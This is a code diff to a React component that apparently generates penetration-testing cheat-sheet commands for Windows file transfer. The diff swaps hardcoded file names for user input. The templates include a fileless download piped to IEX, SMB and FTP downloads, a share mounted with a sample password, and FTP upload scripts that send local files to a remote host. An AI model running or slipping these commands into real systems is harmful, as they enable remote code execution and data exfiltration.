@@ -31,19 +31,19 @@ export default function FileTransfer () {
     const fileLessIEXPipe = `(New-Object Net.WebClient).DownloadString('${ values.target_file_name }') | IEX`
     const iwr = `iwr -Uri '${ values.target_file_name }' -OutFile '${ values.output_file_name }'`
     const InvokeWebRequest = `Invoke-WebRequest -Uri '${ values.target_file_name }' -OutFile '${ values.output_file_name }'`
-    const copyFromSmb = `copy \\\\${ values.ip }\\filename.exe`
+    const copyFromSmb = `copy \\\\${ values.ip }\\${ values.output_file_name }`
     const mountShareWithPasswords = `net use z: \\\\${ values.ip }\\share /user:johnDoe Sup3rP@ssw0rd!`
-    const DownloadFromFTP = `(New-Object System.Net.WebClient).DownloadFile('ftp://${ values.ip }/file.exe','${ values.output_file_name }')`
+    const DownloadFromFTP = `(New-Object System.Net.WebClient).DownloadFile('ftp://${ values.ip }/${ values.output_file_name }','${ values.output_file_name }')`
     const scriptFTP = `echo open ${ values.ip } ${ values.port } > ftp.txt
 echo USER anonymous >> ftp.txt
-echo GET file.exe >> ftp.txt
+echo GET ${ values.output_file_name } >> ftp.txt
 echo BYE >> ftp.txt
 ftp -v -s:ftp.txt`
-    const powershellFTPUpload = `(New-Object System.Net.WebClient).UploadFile('ftp://${ values.ip }/file.exe','C:\\Users\\Public\\file.exe')`
+    const powershellFTPUpload = `(New-Object System.Net.WebClient).UploadFile('ftp://${ values.ip }/${ values.output_file_name }','C:\\Users\\Public\\${ values.output_file_name }')`
     const scriptUploadFTP = `echo open ${ values.ip } ${ values.port } > ftp.txt
 echo USER anonymous >> ftp.txt
 echo binary >> ftp.txt
-echo PUT file.exe >> ftp.txt
+echo PUT ${ values.output_file_name } >> ftp.txt
 echo BYE >> ftp.txt
 ftp -v -s:ftp.txt`
 
